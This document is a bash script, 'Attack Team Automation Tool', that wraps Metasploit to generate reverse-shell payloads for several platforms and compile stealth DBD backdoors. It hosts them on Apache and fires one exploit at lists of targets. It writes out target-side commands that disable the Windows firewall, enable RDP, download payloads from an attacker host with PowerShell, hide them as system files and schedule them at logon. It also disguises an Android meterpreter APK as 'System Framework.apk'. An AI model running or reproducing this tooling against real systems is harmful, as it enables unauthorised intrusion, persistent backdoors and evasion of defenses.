#!/bin/bash
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to start your ATAT"; exit 1; }
resize -s 150 150
clear                                   # Clear the screen.
SERVICE=service;
secs=$(date '+%S');

if ps ax | grep -v grep | grep postgresql > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service postgresql start
fi 
SERVICE1=service;
if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE1 service running"
else
    echo "$SERVICE1 is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Desktop/temp 
clear
clear
echo -e "\E[1;34m==========================================================="
echo -e "\E[1;34m============== \e[97mMetasploit services started \E[1;34m================"
echo -e "\E[1;34m:::::::::::::\e[97mScripts saved to ~/Desktop/temp/\E[1;34m::::::::::::::"
echo -e "\E[1;34m:::::::::::\e[97mPayloads & Results saved to ~/ATAT/\E[1;34m:::::::::::::"
echo -e "\E[1;34m==========================================================="
read -p "Press [Enter] key to Continue..."
clear
echo -e "\E[1;34m======================= \e[97mAttack Team Automation Tool \E[1;34m======================"
if [ 0 -le $secs ] && [ $secs -le 14 ];
then
cat << "EOF"
     _________________________________
    |:::::::::::::;;::::::::::::::::::|
    |:::::::::::'~||~~~``:::::::::::::| 
    |::::::::'   .':     o`:::::::::::|          By |||3N1GmA|||
    |:::::::' oo | |o  o    ::::::::::| 
    |::::::: 8  .'.'    8 o  :::::::::|
    |::::::: 8  | |     8    :::::::::|
    |::::::: _._| |_,...8    :::::::::|
    |::::::'~--.   .--. `.   `::::::::|
    |:::::'     =8     ~  \ o ::::::::| "I Find Your Lack of Faith Disturbing"
    |::::'       8._ 88.   \ o::::::::|
    |:::'   __. ,.ooo~~.    \ o`::::::|
    |:::   . -. 88`78o/:     \  `:::::|        
    |::'     /. o o \ ::      \88`::::|       
    |:;     o|| 8 8 |d.        `8 `:::|       
    |:.       - ^ ^ -'           `-`::|       
    |::.                          .:::|       
    |:::::.....           ::'     ``::|      
    |::::::::-' -        88          `|       
    |:::::-'.          -       ::     |       
    |:-~. . .                   :     |      
    | .. .   ..:   o:8      88o       |       
    |. .     :::   8:P     d888. . .  |       
    |.   .   :88   88      888'  . .  |       
    |   o8  d88P . 88   ' d88P   ..   |       
    |  88P  888   d8P   ' 888         |      
    |   8  d88P.'d:8  .- dP~ o8       | 
    |      888   888    d~ o888       |
    |_________________________________|                          
EOF
elif [ 15 -le $secs ] && [ $secs -le 30 ];
then
cat << "EOF"
                  .?MMMMMMM8$@m-(".-.
                 (MMMMMMMMMMMMMMe(%e9ODA#%eRwC1%%?!-";
                MMMMMMMMMMMMMMMM*%JOMMMMMMMMMMM8M0DC?*%4?".
              .9MMMMMMMMMMMMMMMwe2#MMMMMMRC41%J#M&DC1D8&wM@*M&
             'MMMMMMMMMMMMM0@R9eemMMM#0##M9m**i(%???*i(|1#MRD2
             MMMMMMMMMMM@$449w2C!J%?C%"";"eCw$"|m==||;-`M.
           .MMMMMMMMMDO*i(((||(ii?*1?*%i"=(?mR  1%?(("%!
           mM@MM92e!';"i"?ii(ei;""""";";-(??.
          %MA!!?;"%"="i""mi'-1"""|""=;"""`&(
          .(4?"(=';;"""*9w|.-||(i%%|;`';;.;'
           *eJ;`%("((|i99C|.=|C=!1e;"w......     By ||3N1GmA||
           0m*"1|;"!*(&9me'.-1       M .`..R
           29*"M      -&C(..";       "i .'i%
           #C!%m      MRD"...J        M.;(|.
           @81!9     i&&2;...J=       1;!eiM
          '99*C8     9!"=''`.(%       $A&2"92
          'w=-(?     M%=`.`.e(        AMM*%!.
          CM("A     'OJ%.'.!e         #MMO1w%
          CMA"M.   .MMM%-;'*.         (MMMR0M
         %MMO!wD4 -MMM@%"|"M.        1MMMM8&DJ
         8O1DMMM0w"(!%(*1%"M*       .MM%?AOMMM.
        'R#MMMMMM!24mO91!("=J.      *MMwMMMMMMM
     =C@M0MM@Ae2MMMMMMMA1%"%J4|    %MMMMMMM0@&M?"
   (*M@MMR&&&2C#@#R&&&OC("'.&1='***MMMM#A8&AA1(=(
  ******%(MMMMM@M#OwmJw4A&&i.="2MMM8OwRwCCC1JmD&&$MD   Imperial AT-AT 
EOF
elif [ 31 -le $secs ] && [ $secs -le 45 ];
then
cat << "EOF"
                 ________
            _,.-Y  |  |  Y-._
        .-~"   ||  |  |  |   "-.
        I" ""=="|" !""! "|"[]""|     _____
        L__  [] |..------|:   _[----I" .-{"-.
       I___|  ..| l______|l_ [__L]_[I_/r(=}=-P
      [L______L_[________]______j~  '-=c_]/=-^
       \_I_j.--.\==I|I==_/.--L_]
         [_((==)[`-----"](==)j
            I--I"~~"""~~"I--I
            |[]|         |[]|        By |||3N1GmA|||
            l__j         l__j
            |!!|         |!!|
            |..|         |..|
            ([])         ([])
            ]--[         ]--[
            [_L]         [_L] 
           /|..|\       /|..|\
          `=}--{='     `=}--{='
         .-^--r-^-.   .-^--r-^-.             Imperial AT-AT
EOF
elif [ 46 -le $secs ] && [ $secs -le 57 ];
then
cat << "EOF"
               ._,.
           "..-..pf.
          -L   ..#'
        .+_L  ."]#
        ,'j' .+.j`                 -'.__..,.,p.
       _~ #..<..0.                 .J-.``..._f.
      .7..#_.. _f.                .....-..,`4'
      ;` ,#j.  T'      ..         ..J....,'.j`
     .` .."^.,-0.,,,,yMMMMM,.    ,-.J...+`.j@
    .'.`...' .yMMMMM0M@^=`""g.. .'..J..".'.jH
    j' .'1`  q'^)@@#"^".`"='BNg_...,]_)'...0-
   .T ...I. j"    .'..+,_.'3#MMM0MggCBf....F.
   j/.+'.{..+       `^~'-^~~""""'"""?'"``'1`
   .... .y.}                  `.._-:`_...jf
   g-.  .Lg'                 ..,..'-....,'.
  .'.   .Y^                  .....',].._f    By ||3N1GmA||
  ......-f.                 .-,,.,.-:--&`
                            .`...'..`_J`
                            .~......'#'
                            '..,,.,_]`    
                            .L..`..``. 
EOF
else
cat << "EOF"
     .    .     .            +         .         .                 .  .
      .                 .                   .               .
              .    ,,o         .                  __.o+.
    .            od8^                  .      oo888888P^b           .
       .       ,".o'      .     .             `b^'""`b -`b   .
             ,'.'o'             .   .          t. = -`b -`t.    .
            ; d o' .        ___          _.--.. 8  -  `b  =`b
        .  dooo8<       .o:':__;o.     ,;;o88%%8bb - = `b  =`b.    .
    .     |^88^88=. .,x88/::/ | \\`;;;;;;d%%%%%88%88888/%x88888
          :-88=88%%L8`%`|::|_>-<_||%;;%;8%%=;:::=%8;;\%%%%\8888
      .   |=88 88%%|HHHH|::| >-< |||;%;;8%%=;:::=%8;;;%%%%+|]88        .
          | 88-88%%LL.%.%b::Y_|_Y/%|;;;;`%8%%oo88%:o%.;;;;+|]88  .
          Yx88o88^^'"`^^%8boooood..-\H_Hd%P%%88%P^%%^'\;;;/%%88
         . `"\^\          ~"""""'      d%P """^" ;   = `+' - P
   .        `.`.b   .                :<%%>  .   :  -   d' - P      . .
              .`.b     .        .    `788      ,'-  = d' =.'
       .       ``.b.                           :..-  :'  P
            .   `q.>b         .               `^^^:::::,'       .
                  ""^^               .                     .
  .                                           .               .       .
    .         .          .                 .        +         .
EOF
fi 
tput sgr0                                       # 
echo -e "\e[31m_________________________[ \e[97mChoose Your Destiny \e[31m]________________________"
echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;34m===\e[97m[1] \e[90mPayload              \e[97m [Create MSFVenom Payload]  \E[1;34m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;34m:::\e[97m[2] \e[32mListen               \e[97m [Start a Listener]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[3] \e[34mMsfconsole           \e[97m [Drop into msfconsole]\E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[4] \e[95mPersistence          \e[97m [Create a Persistence Method] \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[5] \e[31mArmitage             \e[97m [Launch the Armitage GUI]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[6] \e[90mMulti-Target Exploit \e[97m [Fire 1 Exploit at Many Targets/Ports]   \E[1;34m"
tput sgr0                               # Reset attributes.
echo -e "\E[1;34m===\e[97m[7] \e[32mAuxiliary & Scanning \e[97m [Run Auxiliary & Scans @ Many Targets/Ports]  \E[1;34m"
tput sgr0
#echo -e "\E[1;34m:::\e[97m[8] \e[34mMulti-Port Auxiliary \e[97m [Run 1 Auxiliary Module Against Many Ports]  \E[1;34m"
#tput sgr0

#echo -e "\E[1;34m:::\e[97m[10]\e[31mMulti-Target Java JMX \e[97m[Fire 1 JMX Exploit at Many Targets]   \E[1;34m"
#tput sgr0
#echo -e "\E[1;34m===\e[97m[11]\e[90mMulti-Target Java RMI \e[97m[Fire 1 RMI Exploit at Many Targets]   \E[1;34m"
#tput sgr0
#echo -e "\E[1;34m:::\e[97m[12]\e[32mMulti-Target SNMP Enum\e[97m[SNMP Enumerate Many Targets]   \E[1;34m"
#tput sgr0
#echo -e "\E[1;34m===\e[97m[13]\e[34mLoad Balance Detection\e[97m[Run LBD Against Many Targets]  \E[1;34m"
#tput sgr0
#echo -e "\E[1;34m:::\e[97m[14]\e[95mMulti-Target SSLScan \e[97m [Run SSLScan Against Many Targets]   \E[1;34m"
#tput sgr0
#echo -e "\E[1;34m===\e[97m[15]\e[31mMasscan All TCP Ports \e[97m[Masscan all TCP Ports on Many Targets]   \E[1;34m"
#tput sgr0
echo -e "\E[1;34m:::\e[97m[8] \e[34mDependency Checker    \e[97m[Check For Dependencies]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[9] \e[95mEmpire & DeathStar  \e[97m  [Pledge Your Allegiance to The Empire]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\e[97m~~~~~~~~~~~~~~~~~~ \e[31mProps to rand0m1ze for the concept!\e[97m~~~~~~~~~~~~~~~~~~\e[31m"
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mChoose Your Weapon\E[1;34m:::::"

PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Custom" "All The Payloads" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
            echo -e "\E[1;34m::::: \e[97mshell.exe saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "Linux")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
            echo -e "\E[1;34m::::: \e[97mshell.elf saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "Mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
            echo -e "\E[1;34m::::: \e[97mshell.macho saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "Android")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
            echo -e "\E[1;34m::::: \e[97mshell.apk saved to ~/ATAT/\E[1;34m:::::"
            ;;  
        "Custom")
cat << "EOF"
<TYPE>:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .dll]

 Rather than putting <DOMAIN/IP>, you can input an interface and ATAT will detect that IP address. 
EOF
            read -p 'Set DOMAIN/IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set TYPE: ' usertype; read -p 'Select CMD/MSF: ' usershell; read -p 'Set BIND/REVERSE: ' userbindrev; read -p 'Set STAGED/STAGELESS: ' userstage; read -p 'Select TCP/HTTP/HTTPS/FIND_PORT: ' userprotocol; read -p 'Select BATCH/LOOP (optional): ' usermode
            /usr/bin/msfpc $usertype $userhost $userport $usershell $userbindrev $userstage $userprotocol $usermode verbose
            echo -e "\E[1;34m::::: \e[97mPayload & RC File Saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "All The Payloads")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport
            /usr/bin/msfpc verbose loop $userhost $userport
            echo -e "\E[1;34m::::: \e[97mPayloads & RC Files Saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "List_All")
            rm msfvenom_payloads.txt
            msfvenom -l | tee msfvenom_payloads.txt
            echo -e "\E[1;34m::::: \e[97mmsfvenom_payloads.txt Saved to ~/ATAT/\E[1;34m:::::"
            ;;   
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[1;34m::::: \e[97mCreate a Listener\E[1;34m:::::"

PS3='Enter your choice: ENTER=Options Menu | 2=Main Menu | 3=QUIT: '
options=("Options" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
        read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
            touch ~/Desktop/temp/meterpreter.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter.rc
            echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter.rc
            echo set LPORT $userport >> ~/Desktop/temp/meterpreter.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
#           echo set AutoRunScript post/multi/gather/multi_command RESOURCE=/root/ATAT/postex.rc >> ~/Desktop/temp/meterpreter.rc
#           echo set AutoRunScript /root/ATAT/ATAT_multi_post.rc >> ~/Desktop/temp/meterpreter.rc
            echo exploit -j >> ~/Desktop/temp/meterpreter.rc
            cat ~/Desktop/temp/meterpreter.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
            ;;
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done
;;

  "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mStarting Metasploit \E[1;34m:::::"
  msfconsole

;;

  "4" | "4" )
# Accept upper or lowercase input.
echo -e "\E[1;34m::::: \e[97mPersistence Generator \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mBind Shells are a Work in Progress \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mThanks to Skysploit for the DBD Builder!! \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
options=("Windows DBD Reverse Shell" "Windows DBD Bind Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell" "DBD Reboot Persistence Generator - Windows" "Android" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows DBD Reverse Shell")
		clear
		read -p "Where shall I send your persistent shell? (LHOST)" attackerip
		echo ""
		read -p "What port will you be listening on? (LPORT)" attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sed "/HOST/s/attackerip/$attackerip/g" ~/ATAT/misc/dbd/conf/dbd_win_reverse.conf > ~/ATAT/misc/dbd/dbd_win_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/dbd_win_reverse1.conf > ~/ATAT/misc/dbd/dbd_win_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_win_reverse2.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_win_reverse1.conf
		rm ~/ATAT/misc/dbd/dbd_win_reverse2.conf
		cd ~/ATAT/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp ~/ATAT/misc/dbd/dbd.exe /var/www/html/winmgnt.txt
		cp ~/ATAT/taskmgnt.txt /var/www/html/taskmgnt.txt
		chown www-data:www-data /var/www/html/winmgnt.txt
		chown www-data:www-data /var/www/html/taskmgnt.txt
		service apache2 start
		clear
		#rm dbd.exe
		cd ~/ATAT
		echo "Starting Apache server to host payloads..."
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.txt (change to EXE for manual deployment)\e[0m"
		echo ""
		
		read -p "Would you like me to launch a listener [y|n]? " listener
		echo ""
		
			if [ "$listener" == "y" ]; then
				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
				read -p "Press any key to contiue" enter
				clear				
			else
				echo -e "\e[1;34mWhen you are ready to receive your shell in your terminal enter:\e[0m"
				echo "dbd -lvp $attackerport -k $attackersecret"
				echo ""
				read -p "Press any key to contiue" enter
				clear
			fi
		echo "While this backdoor is self healing; it will not auto start at reboot."
		echo "To get your shell back after a reboot, open the firewall, & enable RDP, enter the following on the target (commands in RED, one command per line):"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mnetsh firewall set opmode disable\e[97m - This disables the firewall totally (optional depending on target/goals)\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\e[97m- This enables RDP, step 1 (optional depending on target/goals)\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_WORD /d 1 /f\e[97m - This enables RDP, step 2 (optional depending on target/goals)\E[1;34m"
		echo ""
		echo "Now move the \"taskmgnt.txt\" & \"winmgnt.txt\" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec."
		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/taskmgnt.txt','%WINDIR%\System32\\\taskmgnt.exe')\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mattrib +H +S \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mattrib +H +S \"%WINDIR%\System32\\\taskmgnt.exe\"\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31m%WINDIR%\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
            ;;
       "Windows DBD Bind Shell")
        read -p "What port would you like the victim be listening on? (RPORT)" attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/PORT/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/conf/dbd_win_bind.conf > ~/ATAT/misc/dbd/dbd_win_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_win_bind1.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_win_bind1.conf
		cd ~/ATAT/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp ~/ATAT/misc/dbd/dbd.exe /var/www/html/winmgnt.txt
		cp ~/ATAT/taskmgnt.txt /var/www/html/taskmgnt.txt
		chown www-data:www-data /var/www/html/winmgnt.txt
		chown www-data:www-data /var/www/html/taskmgnt.txt
		service apache2 start
		clear
		#rm dbd.exe
		cd ~/ATAT
		echo "Starting Apache server to host payloads..."
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.txt (change to EXE for manual deployment)\e[0m"
		echo ""
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip -p $attackerport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
		echo "While this backdoor is self healing; it will not auto start at reboot."
		echo "To get your shell back after a reboot, open the firewall, & enable RDP, enter the following on the target (commands in RED, one command per line):"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mnetsh firewall set opmode disable\e[97m - This disables the firewall totally (optional depending on target/goals)\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\e[97m- This enables RDP, step 1 (optional depending on target/goals)\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_WORD /d 1 /f\e[97m - This enables RDP, step 2 (optional depending on target/goals)\E[1;34m"
		echo ""
		echo "Now move the \"taskmgnt.txt\" & \"winmgnt.txt\" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec."
		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/taskmgnt.txt','%WINDIR%\System32\\\taskmgnt.exe')\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mattrib +H +S \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mattrib +H +S \"%WINDIR%\System32\\\taskmgnt.exe\"\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31m%WINDIR%\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
            ;;
        "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell")	
		clear
		read -p "Where shall I send your persistent shell? (LHOST)" attackerip
		echo ""
		read -p "What port will you be listening on? (LPORT)" attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/HOST/s/attackerip/$attackerip/g" ~/ATAT/misc/dbd/conf/dbd_unix_reverse.conf > ~/ATAT/misc/dbd/dbd_unix_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/dbd_unix_reverse1.conf > ~/ATAT/misc/dbd/dbd_unix_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_unix_reverse2.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_unix_reverse1.conf
		rm ~/ATAT/misc/dbd/dbd_unix_reverse2.conf
		cd ~/ATAT/misc/dbd/
		make unix
		chmod +x dbd
		cp ~/ATAT/misc/dbd/dbd /var/www/html
		chown www-data:www-data /var/www/html/dbd
		echo "Starting Apache server to host payloads..."
		service apache2 start
		#rm dbd
		#clear
		cd ~/ATAT
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html...\e[0m"
		echo ""
		
		read -p "Would you like me to launch a listener [y|n]? " listener
		echo ""
		
			if [ "$listener" == "y" ]; then
				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
				read -p "Press any key to contiue" enter
				clear
			else
				echo -e "\e[1;34mWhen you are ready to receive your shell in your terminal enter:\e[0m"
				echo "dbd -lvp $attackerport -k $attackersecret"
				echo ""
				read -p "Press any key to contiue" enter
				clear
			fi
			;;
		"Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell")
		clear
		read -p "What port would you like the victim be listening on? (RPORT)" attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/HOST/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/conf/dbd_unix_bind.conf > ~/ATAT/misc/dbd/dbd_unix_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_unix_bind1.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_unix_bind1.conf
		cd ~/ATAT/misc/dbd/
		make unix
		chmod +x dbd
		cp ~/ATAT/misc/dbd/dbd /var/www/html
		chown www-data:www-data /var/www/html/dbd
		echo "Starting Apache server to host payloads..."
		service apache2 start
		#rm dbd
		clear
		cd ~/ATAT
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html...\e[0m"
		echo ""
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip -p $attackerport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
	        ;;
	    "DBD Reboot Persistence Generator - Windows")
        read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost;
			touch  ~/ATAT/DBD_reboot.bat
			echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/winmgnt.txt\',\'%WINDIR%\\System32\\winmgnt.exe\'\) > ~/ATAT/DBD_reboot.bat
			echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/taskmgnt.txt\',\'%WINDIR%\\System32\\taskmgnt.exe\'\) >> ~/ATAT/DBD_reboot.bat
			echo attrib +H +S \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
			echo attrib +H +S \"%WINDIR%\\System32\\\taskmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
			echo %WINDIR%\\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\\System32\\winmgnt.exe >> ~/ATAT/DBD_reboot.bat
			echo schtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
            echo -e "\E[1;34m::::: \e[97mDBD_reboot.bat saved to ~/ATAT. Upload to device and run.\E[1;34m:::::" 
            ;; 
        "Android")
        read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport;
			msfvenom -f raw -p android/meterpreter/reverse_https LHOST=$userhost LPORT=$userport -o "System Framework.jar"
			cp "System Framework.jar" "System Framework.apk"
			rm "System Framework.jar"
			echo -e "\E[1;34m::::: \e[97mSystem Framework.apk saved to ~/ATAT. Upload to device, install, and run.\E[1;34m:::::" 
			echo -e "\E[1;34m::::: \e[97mStart an android/meterpreter/reverse_https listener\E[1;34m:::::" 
            ;; 
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done
;;

  "5" | "5" )
  # 
  echo -e "\E[1;34m::::: \e[97mArmitage Launcher \E[1;34m:::::"
  echo "armitage should be in /opt/armitage"
  echo -e "\E[1;34m::::: \e[97mLaunching...\E[1;34m:::::"
  armitage 

;;

 "6" | "6" )
         
 echo -e "\E[1;34m::::: \e[97mExploit All The Things!!\E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
 
PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Multi-Target")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set RHOST $IP;\
	set RPORT $targetport;\
	set PAYLOAD $userpayload;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"
            ;;
